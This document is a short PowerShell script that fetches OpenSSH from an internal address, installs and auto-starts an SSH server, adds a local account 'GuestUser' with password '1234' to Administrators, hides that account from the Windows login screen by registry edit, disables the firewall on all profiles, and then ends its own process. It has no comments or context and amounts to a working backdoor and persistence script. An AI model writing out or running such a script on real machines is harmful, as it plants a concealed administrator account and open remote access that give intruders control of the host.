Invoke-Webrequest http://192.168.225.23/scripts/OpenSSH-Win64.zip -OutFile $env:TEMP\ssh.zip
Expand-Archive -path $env:TEMP\ssh.zip -destinationpath $env:TEMP\ssh
cd $env:TEMP\ssh\OpenSSH-Win64
powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1
net start sshd
Set-Service sshd -StartupType Automatic
net user GuestUser 1234 /add
net localgroup Administrators GuestUser /add
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v GuestUser /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayUserName /t REG_DWORD /d 1 /f
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
stop-process -Id $PID